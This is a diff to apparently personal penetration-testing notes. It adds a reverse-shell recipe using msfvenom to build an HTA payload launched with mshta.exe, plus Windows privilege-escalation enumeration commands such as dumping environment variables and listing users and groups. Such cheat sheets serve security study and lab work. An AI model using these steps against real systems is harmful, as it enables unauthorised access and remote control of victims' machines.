@@ -10,7 +10,9 @@ Things that we should look for on a system:
     - Installed applications
     - Running processes
 
-
+rev shellwith hta file:
+    msfvenom ..... -f hta-sch -o shell.hta
+    mshta.exe
 Transfer File From Windows To Linux via ssh:
     1.on linux 2. on windows:
     
@@ -104,7 +106,12 @@ Just Download on windows:
 Windows Privesc:
     Enum:
         Users and Groups:
-        
+            check for environment variables:
+
+            in PowerShell:
+                dir env:
+            in cmd:
+                set
             whoami
             whoami /groups
             Get-LocalUser (In PS)
